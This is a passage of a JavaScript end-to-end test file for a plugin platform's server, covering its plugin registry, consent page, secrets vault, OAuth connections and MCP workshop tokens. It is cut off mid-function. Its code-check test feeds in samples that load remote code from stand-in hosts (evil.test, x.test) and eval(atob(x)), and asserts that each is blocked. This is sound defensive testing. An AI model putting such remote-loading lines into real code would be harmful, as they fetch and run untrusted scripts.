// The plugin platform's server side, end to end against a real PostgreSQL: the registry (goal 6), the trusted page
// and consent (goal 3), the vault and connections (goal 8).
import { test, before, after } from 'node:test'
import assert from 'node:assert/strict'
import http from 'node:http'
import crypto from 'node:crypto'
import pg from 'pg'
import { loadConfig } from '../server/config.mjs'
import { connect, runMigrations } from '../server/db/index.mjs'
import { createApp } from '../server/app.mjs'
import { checkCode } from '../server/registry.mjs'
import { isPrivateAddress } from '../server/vault.mjs'

const ADMIN_URL = process.env.TEST_DATABASE_URL || process.env.DATABASE_URL
if (!ADMIN_URL) throw new Error('set TEST_DATABASE_URL')
const DB_NAME = `lc_plug_${process.pid}_${Date.now()}`
const dbUrl = (() => { const u = new URL(ADMIN_URL); u.pathname = `/${DB_NAME}`; return u.toString() })()
const quiet = () => {}
let conn, app, server, base, echo, echoBase
const seen = [] // requests the fake "other site" received

before(async () => {
  const admin = new pg.Client({ connectionString: ADMIN_URL })
  await admin.connect(); await admin.query(`create database "${DB_NAME}"`); await admin.end()
  conn = connect(dbUrl)
  await runMigrations(conn.pool, { log: quiet })
  // a fake third-party API for connections
  echo = http.createServer((req, res) => { seen.push({ url: req.url, auth: req.headers.authorization }); res.writeHead(200, { 'Content-Type': 'application/json' }); res.end(JSON.stringify({ ok: true, echoedKey: req.headers.authorization })) })
  await new Promise((r) => echo.listen(0, '127.0.0.1', r))
  echoBase = `http://127.0.0.1:${echo.address().port}`
  const cfg = loadConfig({ DATABASE_URL: dbUrl, PUSH_DRY_RUN: '1', APP_URL: 'http://lc.test', ADMIN_EMAILS: 'admin@x.test', DIST: '/nonexistent', VAULT_KEY: crypto.randomBytes(32).toString('base64'), CONNECTIONS_ALLOW_PRIVATE: '1', TRUST_PROXY: '1' })
  app = await createApp({ cfg, db: conn.db, pool: conn.pool, log: quiet })
  server = http.createServer(app.handler)
  await new Promise((r) => server.listen(0, '127.0.0.1', r))
  base = `http://127.0.0.1:${server.address().port}`
})
after(async () => {
  app?.close(); server?.close(); echo?.close()
  await conn?.pool.end()
  const admin = new pg.Client({ connectionString: ADMIN_URL })
  await admin.connect(); await admin.query(`drop database if exists "${DB_NAME}" with (force)`); await admin.end()
})

// http.request, not fetch: fetch (undici) overwrites the Sec-Fetch-* headers a browser would send
function raw(method, p, body, headers) {
  return new Promise((resolve, reject) => {
    const req = http.request(base + p, { method, headers: { ...headers, ...(body !== undefined ? { 'Content-Length': Buffer.byteLength(body) } : {}) } }, (res) => {
      const chunks = []
      res.on('data', (c) => chunks.push(c))
      res.on('end', () => resolve({ status: res.statusCode, headers: { get: (k) => { const v = res.headers[k.toLowerCase()]; return Array.isArray(v) ? v.join(', ') : v ?? null } }, text: Buffer.concat(chunks).toString('utf8') }))
    })
    req.on('error', reject)
    if (body !== undefined) req.write(body)
    req.end()
  })
}
function client() {
  let cookie = ''
  const c = async (method, p, body, headers = {}) => {
    const form = typeof body === 'string'
    const res = await raw(method, p, body === undefined ? undefined : form ? body : JSON.stringify(body), { ...(body !== undefined ? { 'Content-Type': form ? 'application/x-www-form-urlencoded' : 'application/json' } : {}), ...(cookie ? { Cookie: cookie } : {}), ...headers })
    const set = res.headers.get('set-cookie')
    if (set) cookie = set.split(';')[0].endsWith('=') ? '' : set.split(';')[0]
    let json = null
    try { json = JSON.parse(res.text) } catch { /* html or js */ }
    return { status: res.status, body: json, text: res.text, headers: res.headers }
  }
  c.cookie = () => cookie
  return c
}
/** Sign-ups are limited per address (10 an hour): later tests sign up from their own. */
const OWN_IP = { 'X-Forwarded-For': '10.9.9.9' }
const NAV = { 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1' }
const nonceOf = (html) => /name="nonce" value="([^"]+)"/.exec(html)?.[1]
/** Open the trusted page for an action and confirm it, the way a person would (form fields as extra). */
async function confirm(c, query, fields = {}) {
  const page = await c('GET', `/trust?${query}`, undefined, NAV)
  assert.equal(page.status, 200, page.text.slice(0, 300))
  const nonce = nonceOf(page.text)
  assert.ok(nonce, `no nonce on ${query}: ${page.text.slice(0, 400)}`)
  const kind = new URLSearchParams(query).get('do')
  const r = await c('POST', '/trust', new URLSearchParams({ nonce, do: kind, decision: 'yes', ...fields }).toString(), NAV)
  // most confirmations go straight back to the console with a notice: show it as the text
  const loc = typeof r.headers.get === 'function' ? r.headers.get('location') : r.headers.location
  if (r.status === 303 && loc) r.text = `${loc} ${decodeURIComponent(loc.replace(/\+/g, ' '))}`
  return r
}

const CODE = `export default {
  sdk: 1, title: 'Habits', icon: 'repeat',
  types: [{ type: 'habits.Habit', kindOf: 'common.Habit', traits: ['titled', 'recurring'] }],
  pages: [{ title: 'Habits', mount(el, lc) { el.textContent = lc.data.list('habits.Habit').length + ' habits' } }],
}
`
let alice, bob, admin, published
test('setup: three accounts', async () => {
  admin = client(); alice = client(); bob = client()
  assert.equal((await admin('POST', '/api/auth/signup', { email: 'admin@x.test', password: 'pw-admin-123' })).status, 201)
  assert.equal((await alice('POST', '/api/auth/signup', { email: 'alice@x.test', password: 'pw-alice-123' })).status, 201)
  assert.equal((await bob('POST', '/api/auth/signup', { email: 'bob@x.test', password: 'pw-bob-1234' })).status, 201)
})

test('automated checks: remote code is blocked; obfuscation, data-door bypass and undeclared sites are flagged', () => {
  assert.equal(checkCode("const m = await import('https://evil.test/x.js')").blocked[0].id, 'remote-code')
  assert.equal(checkCode('eval(atob(x))').blocked[0].id, 'remote-code')
  const w = checkCode("fetch('https://api.example.com/x'); localStorage.getItem('life-console/v1')", { internet: [] }).warnings.map((x) => x.id)
  assert.ok(w.includes('undeclared-sites') && w.includes('data-door'))
  assert.deepEqual(checkCode("fetch('https://www.strava.com/api')", { internet: ['www.strava.com'] }).warnings, [])
})

test('registry: a handle, then publish under it; versions are fixed; others see only public plugins', async () => {
  assert.equal((await alice('POST', '/api/registry/handle', { handle: 'life-console' })).status, 400, 'reserved')
  assert.equal((await alice('POST', '/api/registry/handle', { handle: 'alice' })).body.handle, 'alice')
  // someone who never chose a publisher name gets one from their email when they first publish
  const eve = client()
  await eve('POST', '/api/auth/signup', { email: 'Eve.Smith@x.test', password: 'pw-eve-12345' })
  const ep = await eve('POST', '/api/registry/publish', { name: 'notes', code: CODE.replace("title: 'Habits'", "title: 'Notes'") })
  assert.equal(ep.status, 201)
  assert.equal(ep.body.name, 'eve-smith/notes')
  assert.equal(ep.body.version, '0.1.0', 'no version given: the first one')
  assert.equal((await eve('POST', '/api/registry/publish', { name: 'notes', code: CODE.replace("title: 'Habits'", "title: 'Notes'") })).body.reused, true, 'the same code again: the same version')
  assert.equal((await eve('POST', '/api/registry/publish', { name: 'notes', code: CODE.replace("title: 'Habits'", "title: 'Notes 2'") })).body.version, '0.1.1', 'new code: the next version')
  assert.equal((await eve('POST', '/api/registry/publish', { name: 'copy', code: CODE.replace("title: 'Habits'", "title: 'Notes'") })).status, 201, 'the same code under another name is its own plugin')
  assert.equal((await bob('POST', '/api/registry/handle', { handle: 'alice' })).status, 409, 'taken')
  await bob('POST', '/api/registry/handle', { handle: 'bob' })
  assert.equal((await alice('POST', '/api/registry/publish', { name: 'bob/habits', version: '1.0.0', code: CODE })).status, 403, 'only under your own handle')
  assert.equal((await alice('POST', '/api/registry/publish', { name: 'alice/evil', version: '1.0.0', code: "export default {}; import('https://x.test/a.js')" })).status, 422)
  const r = await alice('POST', '/api/registry/publish', { name: 'alice/habits', version: '1.0.0', code: CODE, manifest: { title: 'Habits', says: { internet: [] } }, visibility: 'private' })
  assert.equal(r.status, 201)
  assert.equal(r.body.hash, crypto.createHash('sha256').update(`alice/habits\n${CODE}`).digest('hex'), 'named by its plugin and its code')
  published = r.body
  assert.equal((await alice('POST', '/api/registry/publish', { name: 'alice/habits', version: '1.0.0', code: CODE + '//x' })).status, 409, 'a version is fixed')
  assert.equal((await bob('GET', '/api/registry/plugins')).body.plugins.length, 0, 'private: bob does not see it')
  assert.equal((await bob('GET', `/api/registry/code/${published.hash}.js`)).status, 404)
  assert.match((await alice('GET', `/api/registry/code/${published.hash}.js`)).text, /export default/, 'the owner can load it')
  assert.equal((await alice('GET', `/api/registry/code/${published.hash}.js`, undefined, { 'Service-Worker': 'script' })).status, 403, 'never registrable as a service worker')
  const pub = await alice('POST', '/api/registry/publish', { name: 'alice/habits', version: '1.1.0', code: CODE.replace('Habits', 'Habits 1.1'), manifest: { title: 'Habits' }, visibility: 'public', changelog: 'Streaks' })
  assert.equal(pub.status, 201)
  const list = (await bob('GET', '/api/registry/plugins')).body.plugins
  assert.equal(list.length, 1)
  assert.equal(list[0].latest.version, '1.1.0')
  assert.equal(list[0].worksWithEverything, true)
  assert.equal((await bob('GET', '/api/registry/plugins/alice/habits')).body.versions.length, 2)
  published = pub.body
})

test('consent: the trusted page refuses fetch(), frames and posts without its nonce', async () => {
  assert.equal((await bob('GET', '/trust?do=enable-plugins')).status, 403, 'no Fetch Metadata: refused')
  assert.equal((await bob('GET', '/trust?do=enable-plugins', undefined, { 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors' })).status, 403, 'a fetch() from a plugin')
  assert.equal((await bob('GET', '/trust?do=enable-plugins', undefined, { 'Sec-Fetch-Dest': 'iframe', 'Sec-Fetch-Mode': 'navigate' })).status, 403, 'a frame')
  const page = await bob('GET', '/trust?do=enable-plugins', undefined, NAV)
  assert.equal(page.status, 200)
  assert.match(page.headers.get('content-security-policy'), /default-src 'none'/)
  assert.ok(!/<script/i.test(page.text), 'no scripts on the trusted page')
  assert.equal(page.headers.get('cross-origin-opener-policy'), 'same-origin')
  const forged = await bob('POST', '/trust', new URLSearchParams({ nonce: 'guess', do: 'enable-plugins', decision: 'yes' }).toString(), NAV)
  assert.equal(forged.status, 400)
  const crossSite = await bob('POST', '/trust', new URLSearchParams({ nonce: nonceOf(page.text), do: 'enable-plugins', decision: 'yes' }).toString(), { ...NAV, 'Sec-Fetch-Site': 'cross-site' })
  assert.equal(crossSite.status, 403)
  // a nonce is bound to the action it was shown for
  const swapped = await bob('POST', '/trust', new URLSearchParams({ nonce: nonceOf(page.text), do: 'delete-account', decision: 'yes' }).toString(), NAV)
  assert.equal(swapped.status, 400)
  assert.equal((await bob('GET', '/api/auth/me')).status, 200, 'still has an account')
})

test('consent: enable Public plugins, install from the registry, load, update, toggle, remove', async () => {
  assert.equal((await bob('GET', '/api/plugins/installed')).body.publicPlugins, false)
  // the first install says it also turns plugins on: one confirmation, not two
  const early = await bob('GET', `/trust?do=install&pkg=alice/habits&hash=${published.hash}&back=/app%23/m/extensions`, undefined, NAV)
  assert.match(early.text, /This is your first extension/)
  assert.match(early.text, /href="\/app#\/m\/extensions">Cancel/, 'Cancel goes back where you came from')
  assert.equal((await bob('GET', `/trust?do=install&pkg=alice/habits&hash=${published.hash}&back=https://evil.test/`, undefined, NAV)).text.includes('evil.test'), false, 'never back to another site')
  const done = await confirm(bob, `do=install&pkg=alice/habits&hash=${published.hash}`)
  assert.equal(done.status, 303, 'straight back to the console')
  assert.match(done.headers.get('location'), /^\/app#\/m\/extensions\?notice=Installed/, 'back where it started, with a notice')
  assert.equal((await bob('GET', '/api/auth/me')).body.user.publicPlugins, true, 'the first install turned plugins on')
  assert.match(done.text, /Installed alice\/habits 1\.1\.0/)
  const inst = (await bob('GET', '/api/plugins/installed')).body.plugins
  assert.equal(inst.length, 1)
  assert.equal(inst[0].hash, published.hash)
  assert.equal(inst[0].enabled, true)
  assert.match((await bob('GET', `/api/registry/code/${published.hash}.js`)).text, /Habits 1.1/, 'the console can load it')
  // a newer version shows up as an update; installing it is another consent
  const v2 = await alice('POST', '/api/registry/publish', { name: 'alice/habits', version: '1.2.0', code: CODE.replace('Habits', 'Habits 1.2'), visibility: 'public', changelog: 'Reminders' })
  assert.equal((await bob('GET', '/api/plugins/installed')).body.plugins[0].update.version, '1.2.0')
  await confirm(bob, `do=install&pkg=alice/habits&hash=${v2.body.hash}`)
  assert.equal((await bob('GET', '/api/plugins/installed')).body.plugins[0].version, '1.2.0')
  await confirm(bob, 'do=toggle&pkg=alice/habits&on=0')
  assert.equal((await bob('GET', '/api/plugins/installed')).body.plugins[0].enabled, false)
  await confirm(bob, 'do=toggle&pkg=alice/habits&on=1')
  // pulled by an admin: it stops loading everywhere
  assert.equal((await alice('POST', '/api/admin/registry/pull', { hash: v2.body.hash })).status, 403)
  assert.equal((await admin('POST', '/api/admin/registry/pull', { hash: v2.body.hash, reason: 'malware' })).status, 200)
  const after = (await bob('GET', '/api/plugins/installed')).body.plugins[0]
  assert.equal(after.enabled, false)
  assert.equal(after.pulled, true)
  assert.equal((await bob('GET', `/api/registry/code/${v2.body.hash}.js`)).status, 404)
  const rm = await confirm(bob, 'do=remove&pkg=alice/habits', { forget: '1' })
  assert.match(rm.text, /forget=alice%2Fhabits/, 'the console is told to delete its data')
  assert.equal((await bob('GET', '/api/plugins/installed')).body.plugins.length, 0)
})

test('registry: likes, installs counted once, and the owner edits the listing or takes it out', async () => {
  const pub = await alice('POST', '/api/registry/publish', { name: 'alice/streaks', code: CODE.replace('Habits', 'Streaks'), visibility: 'public', manifest: { title: 'Streaks', description: 'first words' } })
  assert.equal(pub.status, 201)
  // likes: one per person, undone by DELETE
  assert.equal((await bob('PUT', '/api/registry/plugins/alice/streaks/like', {})).body.likes, 1)
  assert.equal((await bob('PUT', '/api/registry/plugins/alice/streaks/like', {})).body.likes, 1, 'liking twice counts once')
  let card = (await bob('GET', '/api/registry/plugins?q=streaks')).body.plugins.find((p) => p.name === 'alice/streaks')
  assert.equal(card.likes, 1); assert.equal(card.liked, true)
  assert.equal((await bob('DELETE', '/api/registry/plugins/alice/streaks/like', {})).body.likes, 0)
  // installs count people, not updates
  await confirm(bob, `do=install&pkg=alice/streaks&hash=${pub.body.hash}`)
  const v2 = await alice('POST', '/api/registry/publish', { name: 'alice/streaks', code: CODE.replace('Habits', 'Streaks 2'), visibility: 'public' })
  await confirm(bob, `do=install&pkg=alice/streaks&hash=${v2.body.hash}`)
  card = (await bob('GET', '/api/registry/plugins?q=streaks')).body.plugins.find((p) => p.name === 'alice/streaks')
  assert.equal(card.downloads, 1, 'an update is not a second install')
  // only the owner edits the listing; a new version keeps the edited details and stays shared
  assert.equal((await bob('PATCH', '/api/registry/plugins/alice/streaks', { title: 'Mine now' })).status, 404)
  assert.equal((await alice('PATCH', '/api/registry/plugins/alice/streaks', { title: 'Streak counter', description: 'Better words', icon: 'bolt' })).body.title, 'Streak counter')
  await alice('POST', '/api/registry/publish', { name: 'alice/streaks', code: CODE.replace('Habits', 'Streaks 3'), visibility: 'private', manifest: { title: 'Streaks', description: 'first words' } })
  card = (await bob('GET', '/api/registry/plugins?q=streak')).body.plugins.find((p) => p.name === 'alice/streaks')
  assert.equal(card.title, 'Streak counter', 'publishing kept the edited listing')
  assert.equal(card.visibility, 'public', '"Use it" on a shared extension does not hide it')
  // out of the registry: bob has it, so it's unlisted (gone from the list, still loads for him)
  assert.equal((await alice('PATCH', '/api/registry/plugins/alice/streaks', { visibility: 'private' })).body.visibility, 'unlisted')
  assert.ok(!(await admin('GET', '/api/registry/plugins?q=streak')).body.plugins.some((p) => p.name === 'alice/streaks'), 'off the listing')
  assert.equal((await bob('GET', `/api/registry/code/${v2.body.hash}.js`)).status, 200, 'still works for people who installed it')
  await confirm(bob, 'do=remove&pkg=alice/streaks')
  assert.equal((await alice('PATCH', '/api/registry/plugins/alice/streaks', { visibility: 'private' })).body.visibility, 'private', 'nobody else has it: private')
  assert.equal((await alice('PATCH', '/api/registry/plugins/alice/streaks', { visibility: 'public' })).body.visibility, 'public', 'and back (Undo)')
})

test('forks and suggestions: only the author changes an extension; others fork it and suggest versions', async () => {
  const orig = await alice('POST', '/api/registry/publish', { name: 'alice/timer', code: CODE.replace('Habits', 'Timer'), visibility: 'public', manifest: { title: 'Timer' } })
  assert.equal((await bob('POST', '/api/registry/publish', { name: 'alice/timer', code: 'export default { sdk: 1 }' })).status, 403, "nobody publishes over someone else's extension")
  assert.equal((await bob('PATCH', '/api/registry/plugins/alice/timer', { title: 'x' })).status, 404, "nor edits its listing")
  // bob forks it (privately) and suggests his version back
  const fork = await bob('POST', '/api/registry/publish', { name: 'timer', code: CODE.replace('Habits', 'Timer with sounds'), forkOf: 'alice/timer' })
  assert.equal(fork.body.name, 'bob/timer')
  assert.equal((await bob('GET', '/api/registry/plugins/bob/timer')).body.forkedFrom, 'alice/timer')
  assert.equal((await bob('POST', '/api/registry/plugins/alice/timer/suggest', { hash: orig.body.hash })).status, 400, 'only a version of your fork')
  // using your copy: it takes the original's place in your console
  await confirm(bob, `do=install&pkg=alice/timer&hash=${orig.body.hash}`)
  const page = await bob('GET', `/trust?do=install&pkg=bob/timer&hash=${fork.body.hash}`, undefined, NAV)
  assert.match(page.text, /Instead of.*alice\/timer/s)
  await confirm(bob, `do=install&pkg=bob/timer&hash=${fork.body.hash}`)
  assert.deepEqual((await bob('GET', '/api/plugins/installed')).body.plugins.map((p) => p.pkg).filter((n) => n.endsWith('/timer')), ['bob/timer'])
  const sug = await bob('POST', '/api/registry/plugins/alice/timer/suggest', { hash: fork.body.hash, message: 'Adds sounds' })
  assert.equal(sug.status, 201)
  assert.equal((await bob('POST', '/api/registry/plugins/alice/timer/suggest', { hash: fork.body.hash })).body.already, true, 'once per version')
  // alice sees it, can read the private fork's code to review it, and accepts it by publishing it as her next version
  const inbox = (await alice('GET', '/api/registry/suggestions')).body.incoming
  assert.equal(inbox.length, 1); assert.equal(inbox[0].by, 'bob'); assert.equal(inbox[0].message, 'Adds sounds'); assert.equal(inbox[0].fromPackage, 'bob/timer')
  assert.match((await alice('GET', `/api/registry/code/${fork.body.hash}.js`)).text, /Timer with sounds/)
  assert.equal((await admin('GET', `/api/registry/code/${fork.body.hash}.js`)).status, 404, 'nobody else can read the private fork')
  const next = await alice('POST', '/api/registry/publish', { name: 'timer', code: CODE.replace('Habits', 'Timer with sounds'), proposal: inbox[0].id })
  assert.equal(next.body.name, 'alice/timer'); assert.equal(next.body.version, '0.1.1')
  assert.equal((await alice('GET', '/api/registry/suggestions')).body.incoming.length, 0)
  assert.equal((await bob('GET', '/api/registry/suggestions')).body.sent[0].status, 'accepted')
  // declining
  const fork2 = await bob('POST', '/api/registry/publish', { name: 'timer', code: CODE.replace('Habits', 'Timer v3') })
  const s2 = await bob('POST', '/api/registry/plugins/alice/timer/suggest', { hash: fork2.body.hash })
  assert.equal((await bob('POST', `/api/registry/suggestions/${s2.body.id}/decline`, {})).status, 404, 'only the author declines')
  assert.equal((await alice('POST', `/api/registry/suggestions/${s2.body.id}/decline`, {})).status, 200)
  assert.equal((await bob('GET', '/api/registry/suggestions')).body.sent[0].status, 'declined')
})

test('consent: once Public plugins are on, token, password and delete need the trusted page', async () => {
  const t = await bob('POST', '/api/auth/tokens', { name: 'Mac app' })
  assert.equal(t.status, 403)
  assert.equal(t.body.trust, '/trust?do=token')
  assert.equal((await bob('POST', '/api/auth/password', { current: 'pw-bob-1234', password: 'new-pass-999' })).status, 403)
  assert.equal((await bob('DELETE', '/api/auth/me', { password: 'pw-bob-1234' })).status, 403)
  const tok = await confirm(bob, 'do=token&name=Mac%20app')
  const token = /readonly value="([^"]+)"/.exec(tok.text)?.[1]
  assert.ok(token)
  assert.equal((await raw('GET', '/api/auth/me', undefined, { Authorization: `Bearer ${token}` })).status, 200)
  // alice never turned plugins on: her flows are unchanged
  assert.equal((await alice('POST', '/api/auth/tokens', { name: 'Mac app' })).status, 201)
})

test('vault: a key is saved only on the trusted page, never returned, sent only to its site', async () => {
  const host = new URL(echoBase).hostname
  await confirm(bob, `do=vault-save&name=echo&site=${host}`, { secret: 's3cret-key' })
  const list = (await bob('GET', '/api/connections')).body
  assert.equal(list.on, true)
  assert.deepEqual(list.connections.map((c) => [c.name, c.site]), [['echo', host]])
  assert.ok(!JSON.stringify(list).includes('s3cret'), 'never returned')
  const r = await bob('POST', '/api/connections/request', { name: 'echo', url: `${echoBase}/v1/me` })
  assert.equal(r.status, 200)
  assert.equal(seen.at(-1).auth, 'Bearer s3cret-key', 'the server added the key')
  assert.equal(r.body.json.echoedKey, 'Bearer [key]', 'an echoed key is masked in the answer')
  assert.equal((await bob('POST', '/api/connections/request', { name: 'echo', url: 'http://elsewhere.test/x' })).status, 403, 'only to its site')
  assert.equal((await alice('POST', '/api/connections/request', { name: 'echo', url: `${echoBase}/v1/me` })).status, 404, "another account can't use it")
  assert.ok(isPrivateAddress('10.0.0.5') && isPrivateAddress('127.0.0.1') && isPrivateAddress('::1') && !isPrivateAddress('8.8.8.8'))
})

test('consent: delete account on the trusted page', async () => {
  const r = await confirm(bob, 'do=delete-account', { password: 'pw-bob-1234' })
  assert.match(r.text, /Your account is deleted/)
  assert.equal((await bob('GET', '/api/auth/me')).status, 401)
})

test('OAuth connections: connect on the trusted page, tokens in the vault, refreshed by the broker (G7)', async () => {
  // a fake provider: /authorize is never visited by the server; /token issues and refreshes tokens
  let issued = 0
  const prov = http.createServer((req, res) => {
    let body = ''
    req.on('data', (c) => { body += c })
    req.on('end', () => {
      const f = new URLSearchParams(body)
      if (req.url === '/token') {
        issued++
        res.writeHead(200, { 'Content-Type': 'application/json' })
        return res.end(JSON.stringify(f.get('grant_type') === 'refresh_token'
          ? { access_token: `fresh-${issued}`, expires_in: 3600 }
          : { access_token: 'old-token', refresh_token: 'r1', expires_in: 1 })) // expires at once: the broker must refresh
      }
      seen.push({ url: req.url, auth: req.headers.authorization })
      res.writeHead(200, { 'Content-Type': 'application/json' }); res.end('{"ok":true}')
    })
  })
  await new Promise((r) => prov.listen(0, '127.0.0.1', r))
  const pb = `http://127.0.0.1:${prov.address().port}`
  const cfg = loadConfig({ DATABASE_URL: dbUrl, PUSH_DRY_RUN: '1', APP_URL: 'http://lc.test', ADMIN_EMAILS: '', DIST: '/nonexistent', VAULT_KEY: crypto.randomBytes(32).toString('base64'), CONNECTIONS_ALLOW_PRIVATE: '1',
    OAUTH_FAKEFIT_CLIENT_ID: 'cid', OAUTH_FAKEFIT_CLIENT_SECRET: 'csecret', OAUTH_FAKEFIT_AUTH_URL: `${pb}/authorize`, OAUTH_FAKEFIT_TOKEN_URL: `${pb}/token`, OAUTH_FAKEFIT_SITE: '127.0.0.1', OAUTH_FAKEFIT_TITLE: 'FakeFit' })
  assert.deepEqual(Object.keys(cfg.oauthProviders), ['fakefit'], 'only providers with a client id and secret are on')
  const app2 = await createApp({ cfg, db: conn.db, pool: conn.pool, log: quiet })
  const s2 = http.createServer(app2.handler)
  await new Promise((r) => s2.listen(0, '127.0.0.1', r))
  const saveBase = base
  base = `http://127.0.0.1:${s2.address().port}`
  try {
    const carol = client()
    await carol('POST', '/api/auth/signup', { email: 'carol@x.test', password: 'pw-carol-123' })
    assert.deepEqual((await carol('GET', '/api/connections')).body.providers.map((p) => p.name), ['fakefit'])
    const go = await confirm(carol, 'do=connect&provider=fakefit')
    assert.equal(go.status, 303)
    const to = new URL(go.headers.get('location'))
    assert.equal(to.origin + to.pathname, `${pb}/authorize`)
    assert.equal(to.searchParams.get('redirect_uri'), 'http://lc.test/trust/oauth')
    const state = to.searchParams.get('state')
    // the provider sends the person back (a cross-site top-level navigation)
    const back = await carol('GET', `/trust/oauth?code=abc&state=${encodeURIComponent(state)}`, undefined, { ...NAV, 'Sec-Fetch-Site': 'cross-site' })
    assert.match(back.text, /Connected/)
    assert.equal((await carol('GET', `/trust/oauth?code=abc&state=${encodeURIComponent(state)}`, undefined, NAV)).status, 400, 'a state works once')
    const conns = (await carol('GET', '/api/connections')).body.connections
    assert.deepEqual(conns.map((c) => [c.name, c.site, c.scheme]), [['fakefit', '127.0.0.1', 'oauth:fakefit']])
    const r = await carol('POST', '/api/connections/request', { name: 'fakefit', url: `${pb}/v1/athlete` })
    assert.equal(r.status, 200)
    assert.equal(seen.at(-1).auth, 'Bearer fresh-2', 'the expired token was refreshed first')
  } finally { base = saveBase; app2.close(); s2.close(); prov.close() }
})

test('live workshop over MCP: a workshop-only token, drafts reach the open workshop, its preview comes back', async () => {
  const tokenOf = async (c) => {
    const done = await confirm(c, 'do=claude')
    assert.equal(done.status, 200, done.text.slice(0, 300))
    assert.match(done.text, /claude mcp add --transport http life-console http:\/\/lc\.test\/mcp/)
    return /Bearer (lct_[^&"\s]+)/.exec(done.text)[1]
  }
  const bob = client(); const alice = client()
  await bob('POST', '/api/auth/signup', { email: 'live-b@x.test', password: 'pw-live-1234' })
  await alice('POST', '/api/auth/signup', { email: 'live-a@x.test', password: 'pw-live-1234' })
  const token = await tokenOf(bob)
  const rpc = async (tok, method, params, id = 1) => {
    const r = await raw('POST', '/mcp', JSON.stringify({ jsonrpc: '2.0', id, method, params }), { 'Content-Type': 'application/json', Authorization: `Bearer ${tok}` })
    return { status: r.status, body: r.text ? JSON.parse(r.text) : null }
  }
  const tool = async (tok, name, args = {}) => (await rpc(tok, 'tools/call', { name, arguments: args })).body.result

  // the token opens the workshop connection and nothing else
  assert.equal((await raw('GET', '/api/state', undefined, { Authorization: `Bearer ${token}` })).status, 401)
  assert.equal((await raw('POST', '/mcp', '{}', { 'Content-Type': 'application/json', Cookie: bob.cookie() })).status, 401, 'a browser session is not a connection')
  const init = await rpc(token, 'initialize', { protocolVersion: '2025-06-18', capabilities: {}, clientInfo: { name: 'test', version: '1' } })
  assert.equal(init.body.result.protocolVersion, '2025-06-18')
  assert.ok(init.body.result.capabilities.tools)
  assert.equal((await raw('POST', '/mcp', JSON.stringify({ jsonrpc: '2.0', method: 'notifications/initialized' }), { 'Content-Type': 'application/json', Authorization: `Bearer ${token}` })).status, 202)
  const names = (await rpc(token, 'tools/list', {})).body.result.tools.map((t) => t.name)
  for (const n of ['guide', 'list_extensions', 'open_extension', 'read_draft', 'write_draft', 'edit_draft', 'use_draft']) assert.ok(names.includes(n), n)
  assert.match((await tool(token, 'guide')).content[0].text, /lc-card/, 'the guide has the look kit')
  assert.match((await tool(token, 'list_extensions')).content[0].text, /alice\/habits|Installed/)

  // no workshop open: the draft waits for it
  const WATER = "export default { sdk: 1, title: 'Water', slots: { 'today.card': { mount(el) { el.innerHTML = '<div class=\"lc-card\">Water 0 / 8</div>' } } } }\n"
  const first = await tool(token, 'write_draft', { code: WATER, name: 'water' })
  assert.match(first.content[0].text, /isn't open/)

  // the workshop opens (server-sent events): it gets the waiting draft, then each new one, and reports its preview
  const events = []
  let push = () => {}
  const stream = await new Promise((resolve) => {
    const req = http.request(base + '/api/workshop/live', { headers: { Cookie: bob.cookie() } }, (res) => {
      let buf = ''
      res.on('data', (ch) => {
        buf += ch
        for (let i; (i = buf.indexOf('\n\n')) >= 0;) { const line = buf.slice(0, i); buf = buf.slice(i + 2); if (line.startsWith('data: ')) { events.push(JSON.parse(line.slice(6))); push() } }
      })
      resolve(req)
    })
    req.end()
  })
  const next = (type) => new Promise((resolve) => { const look = () => { const e = events.find((x) => x.type === type && !x.taken); if (e) { e.taken = true; resolve(e) } else push = look }; look() })
  const hello = await next('hello')
  assert.equal(hello.draft.code, WATER)
  assert.equal(hello.draft.slug, 'water')
  // the workshop previews what it got
  const preview = async (draft, result) => assert.equal((await bob('POST', '/api/workshop/live/result', { key: draft.key, result })).status, 200)
  await preview(hello.draft, { ok: true, errors: [], problems: [], manifest: { slots: ['today.card'], types: [] }, parts: [{ label: 'On Today', text: 'Water 0 / 8' }] })
  const read = (await tool(token, 'read_draft')).content[0].text
  assert.match(read, /Preview: works/)
  assert.match(read, /\[On Today\] Water 0 \/ 8/)

  // an edit shows up at once, and the tool answers with the preview of exactly that code
  const editing = tool(token, 'edit_draft', { old_text: '0 / 8', new_text: '0 / 10' })
  const changed = await next('draft')
  assert.match(changed.draft.code, /0 \/ 10/)
  await preview(changed.draft, { ok: false, errors: ['On Today: boom'], parts: [] })
  const edited = await editing
  assert.equal(edited.isError, true)
  assert.match(edited.content[0].text, /HAS ERRORS[\s\S]*boom/)
  assert.equal((await tool(token, 'edit_draft', { old_text: 'not there', new_text: 'x' })).isError, true)
  assert.equal((await tool(token, 'use_draft')).isError, true, 'not while it has errors')

  // the person edits by hand: Claude reads their version
  const mine = WATER.replace('0 / 8', '0 / 12')
  await bob('POST', '/api/workshop/live/draft', { code: mine, slug: 'water' })
  const theirs = (await tool(token, 'read_draft')).content[0].text
  assert.match(theirs, /0 \/ 12/)
  assert.match(theirs, /changed by the person/)
  await bob('POST', '/api/workshop/live/result', { key: (await bob('POST', '/api/workshop/live/draft', { code: mine, slug: 'water' })).body.key, result: { ok: true } })
  assert.equal((await tool(token, 'use_draft')).isError, undefined)
  assert.ok((await next('use')), 'the workshop is asked to go to the confirmation page')

  // other accounts never see it
  const other = await tokenOf(alice)
  assert.match((await tool(other, 'read_draft')).content[0].text, /No draft yet/)
  assert.equal((await tool(other, 'use_draft')).isError, true)
  stream.destroy()
})

/** Server-sent events from `p` for client `c`: next(type) resolves with the next event of that type. */
function sse(c, p) {
  const events = []
  let wake = () => {}
  const req = http.request(base + p, { headers: { Cookie: c.cookie() } }, (res) => {
    let buf = ''
    res.on('data', (ch) => {
      buf += ch
      for (let i; (i = buf.indexOf('\n\n')) >= 0;) { const line = buf.slice(0, i); buf = buf.slice(i + 2); if (line.startsWith('data: ')) { events.push(JSON.parse(line.slice(6))); wake() } }
    })
  })
  req.end()
  const next = (type) => new Promise((resolve) => { const look = () => { const e = events.find((x) => x.type === type && !x.taken); if (e) { e.taken = true; resolve(e) } else wake = look }; look() })
  return { next, close: () => req.destroy() }
}
async function mcpToken(c) {
  const done = await confirm(c, 'do=claude')
  return /Bearer (lct_[^&"\s]+)/.exec(done.text)[1]
}
async function mcpTool(tok, name, args = {}) {
